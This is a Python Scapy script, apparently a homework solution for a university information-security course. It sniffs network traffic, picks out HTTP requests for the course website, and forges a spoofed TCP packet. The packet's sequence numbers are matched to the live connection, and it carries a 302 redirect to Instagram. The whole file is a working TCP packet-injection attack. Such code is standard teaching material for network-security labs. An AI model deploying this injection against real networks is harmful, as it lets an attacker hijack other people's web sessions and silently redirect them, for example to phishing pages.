import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    address_ip = ''
    address_tcp = ''
    curr_packet = ''
    i = 1
    try:
        list_of_packets = packet[S.Raw].load.decode('latin-1')
        list_of_packets = list_of_packets.split('\r\n')
        length = len(list_of_packets)
    except:
        return
    while i < (length -1):
        try:
            data = list_of_packets[i].split(':')
            if data[0]== 'Host':
                if data[1].find(WEBSITE) == -1:
                    return
                else:
                    break
        except:
            if list_of_packets[i] != '':
                return
        i = i + 1
    address_ip = packet[S.IP]
    address_tcp = packet[S.TCP]
    curr_packet = S.IP(src=address_ip.dst, dst = address_ip.src)
    curr_packet = curr_packet / S.TCP(sport = address_tcp.dport, dport = address_tcp.sport, flags = 'FA', seq=address_tcp.ack, ack=address_tcp.seq+len(packet[S.Raw]))
    curr_packet = curr_packet / RESPONSE
    return curr_packet
    



def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
